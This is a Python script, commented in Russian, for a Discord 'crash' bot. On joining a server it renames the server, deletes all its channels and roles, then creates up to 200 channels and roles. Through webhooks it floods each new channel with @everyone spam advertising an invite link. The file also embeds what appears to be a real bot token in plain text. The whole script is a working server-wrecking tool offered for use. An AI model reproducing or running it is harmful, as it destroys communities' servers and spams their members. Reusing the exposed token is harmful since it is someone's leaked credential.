# Активность (Название)
ACTIVITY_NAME = "https://discord.gg/pAh9F4rw"

# Активность (Тип) (play (играет), listen (слушает), watch (смотрит))
ACTIVITY_TYPE = "play"

# Текст спама
SPAM_TEXT = "# @everyone Вы были крашнуты великим Negoda6 Negoday squad https://discord.gg/pAh9F4rw"

# Токен для дискорд бота
TOKEN = "MTEyMjU5ODU4NTg4NDc1ODE5Ng.GHopDv.eq8wW4jV-NfLkZJ1WciGYWoO2DSjqXIGWOcqQw"

# Через сколько секунд окончится краш
CRASH_END = 60

import disnake, asyncio
from disnake.ext import commands
bot=commands.Bot(command_prefix="!", intents=disnake.Intents().all())

@bot.event
async def on_ready():
    if ACTIVITY_TYPE == "play": await bot.change_presence(activity=disnake.Game(name=ACTIVITY_NAME))
    if ACTIVITY_TYPE == "listen": await bot.change_presence(activity=disnake.Activity(type=disnake.ActivityType.listening, name=ACTIVITY_NAME))
    if ACTIVITY_TYPE == "watch": await bot.change_presence(activity=disnake.Activity(type=disnake.ActivityType.watching, name=ACTIVITY_NAME))
    
    print(f"Подключен аккаунт {bot.user}!")

async def delete(ent):
    try:
        await ent.delete()
    except Exception as err:
        pass

async def channel_delete(guild):
    channels=[]
    for channel in guild.channels:
        channels.append(channel)
    for i in channels:
        try:
            await asyncio.create_task(delete(i))
        except Exception as err:
            pass
async def role_delete(guild):
    for role in guild.roles:
        try:
            await role.delete()
        except Exception as err:
            pass



async def create_webhook(channel):
    try:
        webhook=await channel.create_webhook(name="Free members")
        for i in range(20):
            await webhook.send(SPAM_TEXT)
            await asyncio.sleep(1)
    except Exception as ex:
        pass

async def create_channel(guild):
    for i in range(200):
        try:
            channel=await guild.create_text_channel("Negoday squad")
            asyncio.create_task(create_webhook(channel))
        except Exception as err:
            pass
            
async def create_role(guild):
    for i in range(200):
        try:
            await guild.create_role(name="Negoday squad")
        except Exception as err: 
            pass

@bot.event
async def on_guild_join(guild):

    print(f"Новый сервер {guild.name} ({guild.id})")
    name=guild.name
    await guild.edit(name="Crashed You Negoday Squad")

    ch_del=asyncio.create_task(channel_delete(guild))
    rl_del=asyncio.create_task(role_delete(guild))

    await asyncio.sleep(5)

    cr_ch=asyncio.create_task(create_channel(guild))
    cr_rl=asyncio.create_task(create_role(guild))
    
    await asyncio.sleep(CRASH_END)

    try: ch_del.cancel()
    except: pass
    try: rl_del.cancel()
    except: pass
    try: cr_ch.cancel()
    except: pass
    try: cr_rl.cancel()
    except: pass
    print(f"Краш {name} ({guild.id}) окончился спустя {CRASH_END} секунд")
    
bot.run(TOKEN)
